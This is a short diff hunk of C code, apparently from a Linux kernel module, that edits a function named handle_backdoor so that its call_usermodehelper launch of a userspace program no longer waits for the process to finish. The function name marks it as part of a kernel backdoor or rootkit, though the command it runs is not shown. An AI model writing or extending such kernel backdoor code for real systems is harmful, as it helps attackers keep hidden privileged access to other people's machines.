@@ -97,7 +97,7 @@ handle_backdoor(unsigned long arg)
         NULL
     };
 
-    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     return 0;
 }
 
